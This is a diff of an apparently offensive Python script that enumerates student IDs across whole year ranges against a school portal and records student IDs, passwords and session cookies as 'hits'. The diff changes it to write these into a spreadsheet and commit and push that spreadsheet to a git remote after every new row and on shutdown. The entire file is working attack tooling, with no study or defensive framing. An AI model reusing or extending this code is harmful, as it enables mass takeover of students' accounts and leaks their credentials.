@@ -1,5 +1,4 @@
 import html as html_lib
-import json
 import os
 import queue
 import re
@@ -33,16 +32,9 @@ COMPLAINT_URL = f"{BASE}/portal/student/complaint"
 FORGOT_URL    = f"{BASE}/public/forgot-password.php"
 
 REPO_ROOT = os.environ.get("REPO_ROOT", ".")
-EXCEL_IN  = os.path.join(REPO_ROOT, "ofes_data.xlsx")
+EXCEL     = os.path.join(REPO_ROOT, "ofes_data.xlsx")
 RESULTS   = os.path.join(REPO_ROOT, "ofes_hits.txt")
 ERRORS    = os.path.join(REPO_ROOT, "ofes_errors.txt")
-
-RUN_DIR   = os.environ.get("RUNNER_TEMP", os.path.join(REPO_ROOT, "run_tmp"))
-os.makedirs(RUN_DIR, exist_ok=True)
-EXCEL_OUT = os.path.join(RUN_DIR, "ofes_data_new_rows.xlsx")
-JSONL_OUT = os.path.join(RUN_DIR, "ofes_new_rows.jsonl")
-
-COMMIT_EVERY = int(os.environ.get("COMMIT_EVERY", "25"))
 
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36")
@@ -74,6 +66,7 @@ _csrf_lock  = threading.Lock()
 _csrf_cache = {}
 _CSRF_TTL   = 120.0
 
+_git_lock = threading.Lock()
 _hit_count = _err_count = _scrape_count = _dup_count = 0
 
 
@@ -289,7 +282,7 @@ CENTER = Alignment(horizontal="center", vertical="center", wrap_text=True)
 COL_WIDTHS = {"A":14,"B":28,"C":22,"D":16,"E":18,"F":55}
 
 
-def git(*args, check=True):
+def git(*args, check=False):
     cp = subprocess.run(["git", "-C", REPO_ROOT, *args],
                         capture_output=True, text=True)
     if check and cp.returncode != 0:
@@ -297,34 +290,43 @@ def git(*args, check=True):
     return cp
 
 
-def git_commit_push(msg, paths):
-    if not paths:
-        return
-    git("add", *paths, check=False)
-    cp = git("commit", "-m", msg, check=False)
+def _do_commit_push(msg):
+    git("add", "ofes_data.xlsx", "ofes_hits.txt", "ofes_errors.txt")
+    cp = git("commit", "-m", msg)
     if "nothing to commit" in (cp.stdout + cp.stderr):
-        return
-    git("pull", "--rebase", "--autostash", "origin", "main", check=False)
-    git("push", "origin", "HEAD:main", check=False)
+        return True
+    for attempt in range(5):
+        pull = git("pull", "--no-rebase", "--no-edit", "origin", "main")
+        if pull.returncode == 0:
+            push = git("push", "origin", "HEAD:main")
+            if push.returncode == 0:
+                return True
+        else:
+            git("merge", "--abort")
+            git("rebase", "--abort")
+        time.sleep(1.0 + attempt)
+    return False
+
+
+def git_commit_push(msg):
+    with _git_lock:
+        return _do_commit_push(msg)
 
 
 class ExcelStore:
-    def __init__(self, repo_xlsx, out_xlsx, out_jsonl):
-        self.repo_xlsx = repo_xlsx
-        self.out_xlsx  = out_xlsx
-        self.out_jsonl = out_jsonl
+    def __init__(self, path):
+        self.path = path
         self.lock = threading.Lock()
-        self.pending = 0
         self.seen_ids = set()
         self.seen_pwds = set()
         self.seen_pairs = set()
         self.new_rows = 0
         self._open()
 
-    def _new_wb(self):
+    def _create(self):
         wb = Workbook()
         ws = wb.active
-        ws.title = "OFES New Rows"
+        ws.title = "OFES Data"
         ws.append([c[0] for c in EXCEL_COLUMNS])
         for cell in ws[1]:
             cell.fill = HEADER_FILL
@@ -333,30 +335,33 @@ class ExcelStore:
         for col, w in COL_WIDTHS.items():
             ws.column_dimensions[col].width = w
         ws.freeze_panes = "A2"
-        return wb, ws
+        self.wb = wb
+        self.ws = ws
 
     def _open(self):
-        if os.path.exists(self.repo_xlsx):
-            try:
-                wb = load_workbook(self.repo_xlsx, read_only=True)
-                ws = wb.active
-                for row in ws.iter_rows(min_row=2, values_only=True):
-                    if row and row[0] and str(row[0]).strip():
-                        self.seen_ids.add(str(row[0]).strip())
-                    if row and len(row) > 3 and row[3] and str(row[3]).strip():
-                        self.seen_pwds.add(str(row[3]).strip())
-                    if row and row[0] and len(row) > 3 and row[3]:
-                        self.seen_pairs.add(
-                            (str(row[0]).strip(), str(row[3]).strip()))
-                wb.close()
-                log("cyan", f"[*] repo xlsx loaded (read-only): {len(self.seen_ids)} ids")
-            except Exception as e:
-                log("yellow", f"[!] repo xlsx read failed ({e}) — treating as empty")
-        else:
-            log("cyan", "[*] no repo xlsx — fresh run")
-        self.wb, self.ws = self._new_wb()
-        self.fh = open(self.out_jsonl, "w", buffering=1)
-        self._save_out()
+        if not os.path.exists(self.path):
+            log("cyan", "[*] no xlsx — creating")
+            self._create()
+            self._save_locked()
+            return
+        try:
+            wb = load_workbook(self.path)
+            ws = wb.active
+        except Exception as e:
+            log("red", f"[-] xlsx open failed: {e}")
+            sys.exit(1)
+        self.wb = wb
+        self.ws = ws
+        for row in ws.iter_rows(min_row=2, values_only=True):
+            if row and row[0] and str(row[0]).strip():
+                self.seen_ids.add(str(row[0]).strip())
+            if row and len(row) > 3 and row[3] and str(row[3]).strip():
+                self.seen_pwds.add(str(row[3]).strip())
+            if row and row[0] and len(row) > 3 and row[3]:
+                self.seen_pairs.add(
+                    (str(row[0]).strip(), str(row[3]).strip()))
+        log("cyan", f"[*] xlsx opened read-write: {len(self.seen_ids)} ids, "
+                    f"{self.ws.max_row - 1} rows")
 
     def has_id(self, sid):
         with self.lock:
@@ -367,6 +372,10 @@ class ExcelStore:
         sid = str(row.get("student_id","") or "").strip()
         pwd = str(row.get("password","") or "").strip()
         with self.lock:
+            if sid and sid in self.seen_ids:
+                _dup_count += 1
+                log("dim", f"[=] dup id={sid}")
+                return False
             if sid and pwd and (sid, pwd) in self.seen_pairs:
                 _dup_count += 1
                 log("dim", f"[=] dup pair id={sid} pwd={pwd}")
@@ -379,14 +388,6 @@ class ExcelStore:
             last = self.ws.max_row
             for i in range(1, len(EXCEL_COLUMNS)+1):
                 self.ws.cell(row=last, column=i).alignment = CENTER
-            payload = {k: row.get(k,"") for _,k in EXCEL_COLUMNS}
-            payload.pop("phpsessid", None)
-            self.fh.write(json.dumps(payload, ensure_ascii=False) + "\n")
-            self.fh.flush()
-            try:
-                os.fsync(self.fh.fileno())
-            except OSError:
-                pass
             if sid:
                 self.seen_ids.add(sid)
             if pwd:
@@ -394,17 +395,17 @@ class ExcelStore:
             if sid and pwd:
                 self.seen_pairs.add((sid, pwd))
             self.new_rows += 1
-            self._save_out()
-            return True
+            self._save_locked()
+        git_commit_push(f"ofes: +{sid} ({self.ws.max_row - 1} rows)")
+        return True
 
-    def _save_out(self):
-        tmp = self.out_xlsx + ".tmp"
+    def _save_locked(self):
+        tmp = self.path + ".tmp"
         try:
             self.wb.save(tmp)
-            os.replace(tmp, self.out_xlsx)
-            self.pending += 1
+            os.replace(tmp, self.path)
         except Exception as e:
-            log("red", f"[-] stage save failed: {e}")
+            log("red", f"[-] save failed: {e}")
             try:
                 if os.path.exists(tmp):
                     os.remove(tmp)
@@ -413,17 +414,13 @@ class ExcelStore:
 
     def save(self):
         with self.lock:
-            self._save_out()
+            self._save_locked()
 
     def close(self):
         with self.lock:
-            self._save_out()
+            self._save_locked()
             try:
                 self.wb.close()
-            except Exception:
-                pass
-            try:
-                self.fh.close()
             except Exception:
                 pass
 
@@ -432,7 +429,7 @@ _store = None
 def get_store():
     global _store
     if _store is None:
-        _store = ExcelStore(EXCEL_IN, EXCEL_OUT, JSONL_OUT)
+        _store = ExcelStore(EXCEL)
     return _store
 
 
@@ -451,9 +448,6 @@ class BufferedLogger:
                 os.fsync(self.fh.fileno())
             except OSError:
                 pass
-        if self.commit:
-            git_commit_push(f"ofes: log {os.path.basename(self.path)}",
-                            ["ofes_hits.txt", "ofes_errors.txt"])
 
     def close(self):
         with self.lock:
@@ -505,32 +499,13 @@ def id_range(year, lo, hi):
     return [f"{year}-{i:0{width}d}" for i in range(lo, hi+1)]
 
 
-def load_existing(path):
-    seen = set()
-    try:
-        with open(path) as fh:
-            for line in fh:
-                line = line.strip()
-                if not line:
-                    continue
-                if " = captured" in line:
-                    seen.add(line.split(":",1)[0].strip())
-                elif "|" in line:
-                    seen.add(line.split("|",1)[0].strip())
-    except FileNotFoundError:
-        pass
-    return seen
-
-
-def run_year(year_str, lo, hi, workers, delay_ms, resume, auto_scrape):
+def run_year(year_str, lo, hi, workers, delay_ms, backfill, auto_scrape):
     all_ids = id_range(year_str, lo, hi)
-    log("cyan", f"[*] year {year_str}: {lo}..{hi}  ({len(all_ids):,} ids)")
-    if resume:
-        seen = load_existing(RESULTS)
-        seen |= get_store().seen_ids
-        before = len(all_ids)
-        all_ids = [i for i in all_ids if i not in seen]
-        log("cyan", f"[*] resume: {len(all_ids):,}/{before:,} remaining")
+    before = len(all_ids)
+    done = get_store().seen_ids
+    all_ids = [i for i in all_ids if i not in done]
+    log("cyan", f"[*] year {year_str}: {lo}..{hi}  queued {len(all_ids):,}/{before:,} "
+                f"(skip={before-len(all_ids):,} already in xlsx)")
     if not all_ids:
         log("cyan", "[*] nothing to do")
         return
@@ -538,7 +513,7 @@ def run_year(year_str, lo, hi, workers, delay_ms, resume, auto_scrape):
     for i in all_ids:
         tq.put(i)
     pool = [build_session(pool_max=workers) for _ in range(workers)]
-    rlog = BufferedLogger(RESULTS, commit=True)
+    rlog = BufferedLogger(RESULTS, commit=False)
     elog = BufferedLogger(ERRORS,  commit=False)
     stop = threading.Event()
     threads = []
@@ -555,6 +530,7 @@ def run_year(year_str, lo, hi, workers, delay_ms, resume, auto_scrape):
         rlog.close()
         elog.close()
         get_store().save()
+        git_commit_push(f"ofes: end year {year_str}")
 
 
 def main():
@@ -564,17 +540,14 @@ def main():
     hi          = int(os.environ.get("SUFFIX_END",  "99999"))
     workers     = int(os.environ.get("WORKERS",     "16"))
     delay_ms    = int(os.environ.get("JITTER_MS",   "10"))
-    resume      = os.environ.get("RESUME", "1") == "1"
+    backfill    = os.environ.get("BACKFILL", "0") == "1"
     auto_scrape = os.environ.get("AUTO_SCRAPE", "1") == "1"
 
     log("cyan", f"[*] years {year_start}..{year_end}")
     log("cyan", f"[*] first-year suffix {lo_first}..{hi}")
     log("cyan", f"[*] later-year suffix 1..{hi}")
-    log("cyan", f"[*] workers={workers} jitter={delay_ms}ms resume={resume} scrape={auto_scrape}")
-    log("cyan", f"[*] commit_every={COMMIT_EVERY}")
-    log("cyan", f"[*] repo xlsx: read-only ({EXCEL_IN})")
-    log("cyan", f"[*] staging xlsx: {EXCEL_OUT}")
-    log("cyan", f"[*] staging jsonl: {JSONL_OUT}")
+    log("cyan", f"[*] workers={workers} jitter={delay_ms}ms backfill={backfill} scrape={auto_scrape}")
+    log("cyan", "[*] queue skip = id in xlsx only (hits.txt ignored)")
 
     t0 = time.time()
     for y in range(year_start, year_end + 1):
@@ -585,32 +558,34 @@ def main():
         log("cyan", f"[*] YEAR {year_str}  suffix {lo}..{hi}")
         log("cyan", "=" * 60)
         try:
-            run_year(year_str, lo, hi, workers, delay_ms, resume, auto_scrape)
+            run_year(year_str, lo, hi, workers, delay_ms, backfill, auto_scrape)
         except KeyboardInterrupt:
             log("yellow", "[!] interrupted")
             break
         except Exception as e:
             log("red", f"[-] year {year_str} failed: {e}")
-        log("cyan", f"[*] checkpoint: year {year_str} done, new_rows={get_store().new_rows}")
+        log("cyan", f"[*] checkpoint: year {year_str} done, rows={get_store().ws.max_row - 1}")
 
     store = get_store()
     store.save()
     store.close()
+    git_commit_push("ofes: final flush")
 
     log("cyan", "")
     log("cyan", "=" * 60)
     log("green", f"[+] DONE in {time.time()-t0:.1f}s")
     log("cyan", f"[*] hits={_hit_count} errors={_err_count} scrapes={_scrape_count} dups={_dup_count}")
-    log("cyan", f"[*] new rows staged: {store.new_rows}")
-    log("cyan", f"[*] repo xlsx untouched: {EXCEL_IN}")
+    log("cyan", f"[*] new rows appended: {store.new_rows}")
+    log("cyan", f"[*] excel rows: {store.ws.max_row - 1}")
 
 
 def _sigterm(signum, frame):
-    log("yellow", "[!] SIGTERM — flushing staging")
+    log("yellow", "[!] SIGTERM — flushing")
     try:
         s = get_store()
         s.save()
         s.close()
+        git_commit_push("ofes: sigterm flush")
     finally:
         sys.exit(0)
 
